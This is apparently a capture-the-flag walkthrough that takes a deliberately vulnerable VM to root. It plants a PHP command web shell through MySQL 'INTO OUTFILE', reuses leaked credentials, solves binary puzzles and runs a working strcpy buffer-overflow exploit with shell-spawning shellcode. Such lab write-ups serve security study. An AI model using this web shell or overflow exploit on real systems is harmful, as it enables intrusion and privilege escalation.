# BOOT 2 ROOT

## Find VM IP address :
 - use ifconfig to find VMWare network mask
 - use nmap to identify ip : `nmap 192.168.142.1/24`

```
Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-13 14:42 CET
Nmap scan report for 192.168.142.1
Host is up (0.00012s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
3283/tcp open  netassistant
3306/tcp open  mysql
5900/tcp open  vnc

Nmap scan report for 192.168.142.130
Host is up (0.00061s latency).
Not shown: 994 closed ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
993/tcp open  imaps

Nmap done: 256 IP addresses (2 hosts up) scanned in 9.77 seconds
```
 - The IP is **192.168.142.130** and we have some services running : FTP, SSH, HTTP, HTTPS


## Find Web Services with a Scanner

  - We used nikto to crawl HTTPS services :

  ```
  gcl https://github.com/sullo/nikto.git /tmp/nikto
  cd /tmp/nikto/program/
  ./nikto.pl -h https://<host>
  ```

  We also used `dirb` which is an alternative to nikto. Both output are in the folder `/scanner/`

  We found 3 main services running :
  - A forum on `/forum/`
  - A webmail service
  - A PhpMyAdmin service



## Getting Access to the database

While looking at the forum's posts, we find out that the **problem login** post contains a password to connect to lmezard email account :
```
Oct 5 08:45:27 BornToSecHackMe sshd[7547]: pam_unix(sshd:auth): check pass; user unknown
Oct 5 08:45:27 BornToSecHackMe sshd[7547]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=161.202.39.38-static.reverse.softlayer.com
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Received disconnect from 161.202.39.38: 3: com.jcraft.jsch.JSchException: Auth fail [preauth]
Oct 5 08:46:01 BornToSecHackMe CRON[7549]: pam_unix(cron:session): session opened for user lmezard by (uid=1040)
```

We can use that to access to her webmail and find out this email * laurie@borntosec.net* / `!q\]Ej?*5K5cy*AJ`
```
Hey Laurie,

You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$

Best regards.
```

We can then connect to the database as root.


## Using PhpMyAdmin to access Server

#### Where to store the backdoor shell in apache server ?
We want to insert a file in the server thx to the mysql root account. This file will include a kind of backdoor shell executing commands and returning result on the webpage.

We need to be able to store the php script in the `/var/www` folder served by apache. The forum service is named `my little forum` (see bottom page of forum). Thanks to its [github page](https://github.com/ilosuna/mylittleforum) we can find a path that we should be able to use in order upload a file :

```
Depending on your server configuration the write permissions of the subdirectory templates_c (CHMOD 770, 775 or 777) and the file config/db_settings.php (CHMOD 666) might need to be changed in order that they are writable by the script.
```

We use the ISO file to know the content of the filesystem. (Read **mount_iso.md**)  
We notice a nice path : **/home/LOOKATME/password**  

#### Shell backdoor ?

This allow us to run shell commands through the web server.
- store file : `SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "/var/www/forum/templates_c/test.php"`
- browse at : `<vm_ip>/forum/templates_c/test.php?cmd=cat /home/LOOKATME/password`
- result : `lmezard:G!@M6f4Eatau{sF"`

We can now connect to **lmezard** account on VM (or get files with `ftp`).


## LMEZARD level

#### Get files

We gonna use `ftp` command to fetch documents from `lmezard` home :
```
➜  ~ ftp lmezard@<VM_IP>
Connected to 172.16.34.131.
220 Welcome on this server
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> ls -laR
229 Entering Extended Passive Mode (|||35241|).
150 Here comes the directory listing.
dr-xr-x---    2 1001     1001           61 Oct 15  2015 .
dr-xr-x---    2 1001     1001           61 Oct 15  2015 ..
-rw-r--r--    1 0        0               1 Oct 15  2015 .bash_history
-rwxr-x---    1 1001     1001           96 Oct 15  2015 README
-rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun
226 Directory send OK.

// set up a download diretory. create it in host before.

ftp> lcd /tmp/lmezard/
Local directory now: /private/tmp/lmezard

// Download the 2 files.

ftp> get README
ftp> get fun
```

#### fun archive

```
cd /tmp/lmezard/
tar -xvf fun
cd ft_fun
cat * | grep 'return'
```

Lot of files, containing various instructions in **C**.  
We understood that we needed to merge them. Each file has a number on it : `//fileXXX` where XXX is a file number. We write a python script (`/lmezard/merge_files.py`) to read all files and merge them in the good order. We can then compile the merged program. By running it we get the password.

- `Iheartpwnage` -> sha256 = `330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4`

## laurie's bomb

We entered Laurie's home directory and we have :
- a **README** with :
```
  laurie@BornToSecHackMe:~$ cat README
  Diffuse this bomb!
  When you have all the password use it as "thor" user with ssh.

  HINT:
  P
   2
   b

  o
  4

  NO SPACE IN THE PASSWORD (password is case sensitive).
```
- a **bomb** binary
```
  laurie@BornToSecHackMe:~$ file bomb
  bomb: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.0.0, not stripped
```

Let's try it out !!!
```
laurie@BornToSecHackMe:~$ ./bomb
Welcome this is my little bomb !!!! You have 6 stages with
only one life good luck !! Have a nice day!
123

BOOM!!!
The bomb has blown up.
```

We have 6 stages to decrypt. Let's crack'em down. We are using gdb with *peda* framework to easier the process.
The translation in *pseudo-C* of most important functions are in the file `/laurie/stages.c`

### Stage 1

Those are the general command to achieve the level.
We have a call to a function checking 2 strings to compare equality. One is our input and the other is : `0x80497c0 ("Public speaking is very easy.")`

```
gdb bomb
b phase_1
run
<enter input for level1>
ni (until before strings_not_equal call)
```

### Stage 2

- `read_six_numbers` -> scan 6 numbers ("%d %d %d %d %d %d"). Explode if less than 6 numbers.
- Enter a loop and expect each number to be `index+1` time the previous one : 
  - **1 2 6 24 120 720** (1 x 2 = 2, 2 x 3 = 6, 6 x 4 = 24, ...)

  The solution is : `1 2 6 24 120 720`


### Stage 3

We need to unter a passwor composed of : `%d %c %d`  
by analysing the assembly code we get whats going on. Depending on the first number we have different combination that works, but only one is intersting for us. We need a **b** as a second argument, so we have 4 possibilities, after trying them all we get :
```
1 b 214
2 b 755
7 b 524
```

### Stage 4

This one is easy, it takes a single integer and a recursive function computes on it. We then need to have `func4(nb) == 55`. We did a python script (`/laurie/stage_4.py`) to simulate **func4** and the answer is 9.

### Stage 5

this one is a little trickier :
We have to build a string that is equal to `giants`.
- The program has a main string : `"isrveawhobpnutfg\260\001"`
- The input we give is used as indexes to pick a char in main string. (eg. **'000000'** -> **'iiiiii'**) However only the last 4 bytes value is taken into account : "1234**5678**" -> `5678`

So we need to pick indexes (knowing that 1st char is `o`) :
- 15 -> `o`
- 0 -> `p`
- 5 -> `e`
- 11 -> `k`
- 13 -> `m`
- 1 -> `q`

### Stage 6

The steps of this level are :
- read 6 numbers (the first one is `4` thx to the README tip)
- check that each number are different & below 6
- build a new buffer on number indexed on input value (buffer[4], buffer[2])
- then checks if the new buffer is ordered in decreased order.
- the buffer on number being `[253, 725, 301, 997, 212, 432]` :
  - the solution is  `[4, 2, 6, 3, 1, 5]`



### The full solution
The different passwords are (after trying to connect as thor with multiple possible passwords from stage3):
```
Public speaking is very easy.
1 2 6 24 120 720
1 b 214
9
opekmq
4 2 6 3 1 5
```
which gives us : `Publicspeakingisveryeasy.126241207201b2149opekmq426135`

## Thor level
This level contains a **turtle** file containing various commands : 
```
...
Avance 1 spaces
Tourne droite de 1 degrees
Avance 50 spaces

Avance 100 spaces
Recule 200 spaces
...
```

We found out that turtle is a [python package](https://docs.python.org/3.3/library/turtle.html?highlight=turtle) that allow us to draw figures by moving a "turtle".
We realized a python script (`/thor/turtle.py`) that parses the **turtle file** and draw the content.
However this script doesnt work in the *VM* because it uses a graphical interface **tkinter**. Se we copy the file and run it on the host:
```
scp thor@<vm_ip>:turtle /tmp/turtle
cp <python_script_path> /tmp/thor.py
cd /tmp/
python /tmp/thor.py
```

#### What does it draw
It draws the word : **SLASH**.
We can now connect as **zaz** user by hashing it with `md5` function.
-> `646da671ca01bb5d84dbb5fb2238dc8e`

## Zaz level

## Analyse

There is a suid root bin in home directory 'exploit_me'.

```bash
zaz@BornToSecHackMe:~$ ls -l
total 5
-rwsr-s--- 1 root zaz 4880 Oct  8  2015 exploit_me
drwxr-x--- 3 zaz  zaz  107 Oct  8  2015 mail
```

The executable use unsafe function strcpy. Strcpy write into static buffer from user argument.

```bash
zaz@BornToSecHackMe:~$ ltrace ./exploit_me TOTO
__libc_start_main(0x80483f4, 2, 0xbffff7e4, 0x8048440, 0x80484b0 <unfinished ...>
strcpy(0xbffff6c0, "TOTO")                                                                                      = 0xbffff6c0
puts("TOTO"TOTO
)                                                                                                    = 5
+++ exited (status 0) +++
```

We can put exploit_me in default by giving it an argument of great length

```bash
zaz@BornToSecHackMe:~$ ./exploit_me BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
Segmentation fault (core dumped)
zaz@BornToSecHackMe:~$
```

## Exploit

### With unsafe strcpy we can control save eip, so control the flow execution and spanw a shell

#### 1. find eip with https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/ and gdb

```bash
zaz@BornToSecHackMe:~$ gdb ./exploit_me
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/zaz/exploit_me...(no debugging symbols found)...done.
(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Starting program: /home/zaz/exploit_me Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
0x37654136 in ?? ()
(gdb)
```

Save eip is stored in (buffer's address + 140) `[ADDR BUFFER + 140 + SEIP]`

#### 2. Create Shellcode and know where is it

```bash
zaz@BornToSecHackMe:~$ env -i SHELLCODE=$(python -c 'print "\x31\xdb\x31\xd2\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc0\xb0\x0b\xcd\x80"') PWD=$PWD gdb -q $PWD/exploit_me

(gdb) show env
SHELLCODE=1�1�1�Qhn/shh//bi��1��
                                 ̀
PWD=/home/zaz
LINES=83
COLUMNS=181
(gdb) unset env LINES
(gdb) unset env COLUMNS
(gdb) show env
SHELLCODE=1�1�1�Qhn/shh//bi��1��
                                 ̀
PWD=/home/zaz
(gdb) start
Temporary breakpoint 1 at 0x80483f7
Starting program: /home/zaz/exploit_me

Temporary breakpoint 1, 0x080483f7 in main ()
(gdb) x/10s *((char **)environ)
0xbfffffb5:     "PWD=/home/zaz"
0xbfffffc3:     "SHELLCODE=1\333\061\322\061\311Qhn/shh//bi\211\343\061\300\260\v\315\200"
0xbfffffe7:     "/home/zaz/exploit_me"
0xbffffffc:     ""
0xbffffffd:     ""
0xbffffffe:     ""
0xbfffffff:     ""
0xc0000000:     <Address 0xc0000000 out of bounds>
0xc0000000:     <Address 0xc0000000 out of bounds>
0xc0000000:     <Address 0xc0000000 out of bounds>
(gdb) quit
A debugging session is active.

    Inferior 1 [process 2379] will be killed.

Quit anyway? (y or n) y
```

#### 3. Exploit exploit_me

```bash
zaz@BornToSecHackMe:~$ env -i SHELLCODE=$(python -c 'print "\x31\xdb\x31\xd2\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc0\xb0\x0b\xcd\x80"') PWD=$PWD $PWD/exploit_me $(python -c 'print "\x90" * 140 + "\xbf\xff\xff\xc3"[::-1] ')
������������������������������������������������������������������������������������������������������������������������������������������������
# whoami
root
# :D
```
